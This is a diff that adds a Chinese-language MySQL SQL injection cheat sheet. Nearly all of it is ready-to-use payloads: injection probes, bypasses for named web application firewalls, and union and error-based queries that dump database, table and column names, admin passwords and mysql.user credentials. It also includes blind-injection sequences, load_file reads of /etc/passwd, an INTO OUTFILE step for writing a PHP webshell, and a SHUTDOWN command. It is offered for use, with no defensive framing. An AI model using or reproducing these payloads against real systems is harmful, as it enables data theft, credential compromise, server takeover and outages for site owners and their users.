@@ -1,0 +1,206 @@
+id=1') and 1=2
+id=1' and '1'='2
+id=1) and 1=1  -- M
+id=1 and 1=1 --+
+
+and 1=1
+' and '1'='1
+
+or 1=1--+
+'or 1=1--+
+"or 1=1--+
+)or 1=1--+
+')or 1=1--+
+") or 1=1--+
+"))or 1=1--+
+or not 1=1# 和 or not 1=2  #基于update注入判断
+
+version()           
+user()               
+database()   
+group_concat(schema_name) from information_schema.schemata  #查询所有数据库
+group_concat(table_name) from information_schema.tables where table_schema=database()  #查询当前数据库
+@@datadir            
+@@version_compile_os 
+
+过360主机卫士 
+在注入关键字后加%23%0a（也就是注释符和换行符）
+union select   --> union%23%0a select%23%0a
+and            --> and%23%0a
+order by       --> order%23%0a by 
+过360主机卫士的另一种方法
+如果请求是  xxxx.php?id= 改成 xxx.php/manage?id= 就能秒360主机卫士
+
+过WTS-WAF
+注入关键字前后 加上一个+号
+
+
+数值型
+1、判断注入 and 87=87 返回正确 and 87=89 返回错误 
+
+2、查看字段数 order by num 返回正确页面的num的最大值即为字段数
+
+3、查看输出项
+   union select 1,2,3,4,5,6,7,8,9 
+
+4、查看数据库版本和当前用户
+   and ord(mid(version(),1,1))>51 返回正常说明是4.0以上版本
+   union select 1,2,user(),4,5,6
+   union select 1,2,current_user(),3,4,5,6
+   union select 1,2,version(),4,5,database(),7,8,9
+   union select 1,2,@@version,4,5,6,7,8,9
+   union select 1,2,unhex(hex(@@version)),4,5,6,7,8,9 如果这样才能显示正确显示数据，那么下面的表名和列名都必须以这种方式
+   显示所有的数据库(所有数据库的值存放到information_schema下的表schemata下的列schema_name中)
+   id=-2 UNION all SeLECT 1,2,3,4,5,6,7,8,9,group_concat(schema_name),11,12 from information_schema.schemata --+
+
+5、如果mysql版本为5.0以上，那么
+--------------------------------------------------------------------------------------------------------------
+
+   5.1、列出表名
+   union select 1,2,table_name from information_schema.tables
+   在一个组里显示table_name
+   union select 1,2,group_concat(table_name),4,5,6,7,8,9 from information_schema.tables
+   有时候只能显示information_schema下的表，并不能显示其它库的表所以得用table_schema(库名必须加密成16进制)来指定查询哪个库的表
+   id=-2 UNION SeLECT 1,2,3,4,5,6,7,8,9,group_concat(table_name),11,12,from information_schema.tables where table_schema=0x6368696e69756b656a69 --+
+   
+
+  
+   5.2、列出指定表下的列名
+   得到表名后查询指定表的列名，比如表名为yang_admin
+   这里表名必须用16进制
+   union select 1,2,column_name,4,5,6,7,8,9 from information_schema.columns where table_name=0x79616e675f61646d696e
+   
+   5.3、列出指定列名下的值
+   根据列名猜解出各列的数据(--表示注释+表示空格 --+表示注释掉后面的语句)
+   provinceid=530000 union%23%0a select%23%0a 1,2,concat(username,'.',userpwd),4,5,6 from%23%0a yang_admin %23--+
+   用冒号分开显示账号密码(0x3a代表冒号)
+   provinceid=530000 union%23%0a select%23%0a 1,2,concat(username,0x3a,userpwd),4,5,6 from%23%0a yang_admin %23--+
+   通过逗号把username和userpwd分开
+   provinceid=530000 union%23%0a select%23%0a 1,2,concat_ws(',',username,userpwd),4,5,6 from%23%0a yang_admin %23--+
+   要猜解的数据放到一个组里面
+   provinceid=530000 union%23%0a select%23%0a 1,2,group_concat(username,userpwd),4,5,6 from%23%0a yang_admin %23--+
+   利用limit来显示从第16行开始，显示7个数据
+   provinceid=530000 union%23%0a select%23%0a 1,2,concat(username,userpwd),4,5,6 from%23%0a yang_admin limit 16,7 %23--+
+------------------------------------------------------------------------------------------------------------------
+6、如果是4.x版本，因为这个版本没有information_schema.tables 和information_schema.columns 所以猜解表和列就和access的方法差不多了
+---------------------------------------------------------------------------------------------------------------------   
+   6.1、猜解表名
+   union select 1,2,3,4,5,6,7,8,9 from user 一个表名一个表名测试直到页面返回正确，即找到正确的表名
+   6.2、猜解列名
+   union select 1,2,username,4,5,6 from user 一个列名一个列名的测试，直到页面返回正常
+---------------------------------------------------------------------------------------------------------------------
+
+7、如果权限够大，获取root账号密码
+provinceid=530000 union%23%0a select%23%0a 1,2,concat(username,0x3a,password),4,5,6 from mysql.user %23--+
+
+8、查看文件
+site.com/article.php?id=5+UNION+ALL+SELECT+load_file('etc/passwd'),2/*
+但有时候，你必须对部件进行hex并执行以下操作：
+<?php
+site.com/article.php?id=5+UNION+ALL+SELECT+load_file(0x272F6574632F70617373776427)  
+
+9、写文件
+nto outfile写文件
+
+union select 1,2,3,char(这里写入你转换成10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 into outfile ‘d:\web\90team.php’/*
+
+union select 1,2,3,load_file(‘d:\web\logo123.jpg’),5,6,7,8,9,10,7 into outfile ‘d:\web\90team.php’/*
+
+9、关闭MYSQL
+site.com/article.php?id=5+SHUTDOWN+WITH+NOWAIT;  
+
+
+
+
+
+
+报错型注入可尝试如下
+extractvalue(xml文档名,xml文档路径) 来列出信息 最多只能列出32位数据
+1、查看版本信息
+33' and extractvalue(0x34,concat(0x7e,0x3a,version() )) and '87'='87
+33' and extractvalue(rand(),concat(0x7e,0x3a,version() )) and '87'='87
+33' and extractvalue(rand(),concat(0x7e,0x3a,version() )) --+
+
+2、爆出所有的数据库 limit 0,1 取第一个数据 limit 1,1 取第二个数据
+
+news.php?maintype=33' and extractvalue(rand(),concat(0x7e,substring((select schema_name from information_schema.schemata limit 0,1 ),1,32)%20)) --+
+
+3、爆出所有的表
+news.php?maintype=33' and extractvalue(rand(),concat(0x7e,substring((select table_name from information_schema.tables where table_schema=库名的16进制 limit 0,1 ),1,32)%20)) --+
+
+4、根据相应的表爆出字段
+news.php?maintype=33' and extractvalue(rand(),concat(0x7e,substring((select column_name from information_schema.columns where table_name=表名的16进制 limit 0,1 ),1,32)%20)) --+
+
+5、根据字段爆出内容
+news.php?maintype=33' and extractvalue(rand(),concat(0x7e,substring((select concat(admin_name,0x3a,admin_pw) from admin limit 0,1),1,32)%20)) --+
+
+除此之外还有updatexml('anything','查询语句','anything')
+updatexml(rand(),concat(0x7e,SQL语句),rand()) --+
+如下
+GET /news.php?maintype=33' and updatexml(rand(),concat(0x7e,version()%20),rand()) --+
+
+
+
+
+ 报错注入：
+ 1、暴数据库：
+and (select 1 from(select count(*),concat((select (select (select concat(0x7e,schema_name,0x7e))) from information_schema.schemata  limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+2、暴数据表：
+and (select 1 from(select count(*),concat((select (select (select concat(0x7e,table_name,0x7e))) from information_schema.tables where table_schema=库名的十六进制  limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+3、暴列名：
+and (select 1 from(select count(*),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+4、暴字段：
+and (select 1 from(select count(*),concat((select (select (select concat(0x7e,字段名,0x7e))) from 库名.表名 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+   
+盲注：
+1、判断当前数据库的长度
+   and length(database())>=20
+
+2、开始盲注当前数据库 库名 N从1开始一直到数据库的长度的最大值
+   and ascii(substr(database(),N,1))>=100 --+
+
+3、表名
+   表名个数
+   and%23%0A (SELECT%23%0A count (table_name) from information_schema.tables where table_schema=database())>=12
+
+   猜解第一个表名的长度
+   and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 
+
+   猜解第一个表 第N位
+   and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),N,1))>97
+
+   猜解第二个表 第N位
+   and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),N,1))>97
+
+4、列名
+   猜解字段数量
+   and (select count(column_name) from information_schema.columns where table_name=0x2332431)=1
+   猜解第N个列名的长度
+   and length(substr((select column_name from information_schema.columns where table_name=0x42342334423 limit N-1,1),1))=1
+   
+   猜解第一个列名内容
+   and ascii(substr((select column_name from information_schema.columns where table_name=0x42342334423 limit 0,1),N,1))=1
+
+   猜解第二个 列名内容
+   and ascii(substr((select column_name from information_schema.columns where table_name=0x42342334423 limit 1,1),N,1))=1
+   猜解第三个列名内容
+   and ascii(substr((select column_name from information_schema.columns where table_name=0x42342334423 limit 2,1),N,1))=1
+
+
+
+   
+
+
+MySQL >= 5.0.12+php+字符型+union select被过滤
+Payload
+(1)' and 'a'='a
+(2)' order by xxx --+
+(3)
+
+
+PHP 5.3.29+MySQL >= 5.0+单引号被反斜杠转义+union all被过滤
+Payload:
+(1)id=1 AND 1=1
+(2)报错Payload
+and updatexml(1,concat(0x7e,user()),1)
+
